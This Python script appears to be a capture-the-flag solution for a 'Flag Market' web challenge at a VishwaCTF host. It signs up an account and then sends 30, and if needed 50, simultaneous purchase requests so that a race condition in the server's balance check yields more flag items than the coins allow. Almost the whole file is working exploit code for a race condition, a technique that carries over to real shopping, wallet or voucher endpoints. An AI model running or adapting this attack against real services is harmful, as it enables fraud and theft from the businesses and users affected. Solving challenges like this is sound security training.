#!/usr/bin/env python3
"""
Flag Market - Aggressive Race Condition
Uses asyncio for truly concurrent requests
"""

import asyncio
import aiohttp
import time

BASE_URL = "https://market.vishwactf.com"

async def create_account():
    """Create a new account"""
    username = f"racer_{int(time.time())}"
    password = "password123"
    
    print(f"[*] Creating account: {username}")
    
    async with aiohttp.ClientSession() as session:
        async with session.post(f"{BASE_URL}/api/signup", json={
            "username": username,
            "password": password
        }) as resp:
            result = await resp.json()
            
            if result.get("success"):
                print(f"[+] Account created successfully")
                print(f"[+] Initial coins: {result.get('coins')}")
                
                # Extract cookies
                cookies = {}
                for cookie in session.cookie_jar:
                    cookies[cookie.key] = cookie.value
                
                return cookies
            else:
                print(f"[-] Failed to create account: {result}")
                return None

async def buy_item(session, item_id, thread_id):
    """Buy a single item"""
    try:
        async with session.post(f"{BASE_URL}/api/buy", json={"itemId": item_id}) as resp:
            result = await resp.json()
            
            if result.get("success"):
                print(f"[+] Thread {thread_id}: Purchase successful! Inventory: {result.get('inventoryCount')}")
                if result.get("flag"):
                    print(f"[!!!] FLAG FOUND: {result['flag']}")
                    return result['flag']
                return True
            else:
                print(f"[-] Thread {thread_id}: {result.get('message', 'Purchase failed')}")
                return False
    except Exception as e:
        print(f"[-] Thread {thread_id}: Error - {e}")
        return False

async def get_user_info(session):
    """Get current user info"""
    async with session.get(f"{BASE_URL}/api/user") as resp:
        return await resp.json()

async def race_attack(cookies, num_requests=30):
    """Launch truly concurrent requests"""
    print(f"\n[*] Launching {num_requests} simultaneous requests...")
    
    # Create session with cookies
    jar = aiohttp.CookieJar()
    async with aiohttp.ClientSession(cookie_jar=jar) as session:
        # Set cookies
        for key, value in cookies.items():
            session.cookie_jar.update_cookies({key: value})
        
        # Check initial state
        user_info = await get_user_info(session)
        print(f"[*] Initial coins: {user_info.get('coins')}")
        
        # Launch all requests at the EXACT same time
        tasks = [buy_item(session, "flag_artifact", i) for i in range(num_requests)]
        results = await asyncio.gather(*tasks)
        
        # Wait a bit for server to process
        await asyncio.sleep(2)
        
        # Check final state
        user_info = await get_user_info(session)
        print(f"\n[*] Final state:")
        print(f"    Coins: {user_info.get('coins')}")
        print(f"    Inventory: {user_info.get('inventory', {})}")
        
        flag_count = user_info.get('inventory', {}).get('flag_artifact', 0)
        print(f"[*] Flag artifacts acquired: {flag_count}/10")
        
        # Extract flags
        flags = [r for r in results if isinstance(r, str) and r.startswith("VishwaCTF")]
        return flags

async def main():
    print("=" * 60)
    print("Flag Market - Aggressive Race Condition")
    print("=" * 60)
    
    # Create account and get cookies
    cookies = await create_account()
    if not cookies:
        return
    
    await asyncio.sleep(1)
    
    # Launch attack
    flags = await race_attack(cookies, num_requests=30)
    
    if flags:
        print(f"\n{'='*60}")
        print(f"[!!!] FLAG CAPTURED:")
        for flag in set(flags):
            print(f"      {flag}")
        print(f"{'='*60}")
    else:
        print("\n[-] No flag received. Trying again with more requests...")
        flags = await race_attack(cookies, num_requests=50)
        
        if flags:
            print(f"\n{'='*60}")
            print(f"[!!!] FLAG CAPTURED:")
            for flag in set(flags):
                print(f"      {flag}")
            print(f"{'='*60}")

if __name__ == "__main__":
    asyncio.run(main())
